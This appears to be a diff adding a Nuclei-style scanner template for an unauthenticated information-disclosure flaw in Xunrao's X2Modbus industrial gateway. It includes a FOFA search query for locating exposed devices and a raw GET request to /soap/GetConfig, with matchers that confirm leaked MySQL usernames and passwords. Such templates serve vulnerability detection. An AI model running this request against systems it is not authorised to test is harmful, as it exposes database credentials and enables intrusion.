@@ -1,0 +1,30 @@
+id: X2Modbus-GetConfig-Information-disclosure
+
+info:
+  tags: X2Modbus-GetConfig-Information-disclosure
+  name: 迅饶科技 X2Modbus网关 GetConfig 信息泄露漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: icon_hash="-1384370370"
+    迅饶科技 X2Modbus网关 GetConfig 存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取数据库用户密码等敏感信息，从而登录数据库，使数据库处于极不安全的状态。
+http:
+  - raw:
+      - |
+        GET /soap/GetConfig HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<MySQL'
+          - 'DBPort='
+          - 'UserName='
+          - 'DBName='
+          - 'Password='
+          - 'EnableMySQL="1"'
+        condition: and
+      - type: status
+        status: 
+          - 200
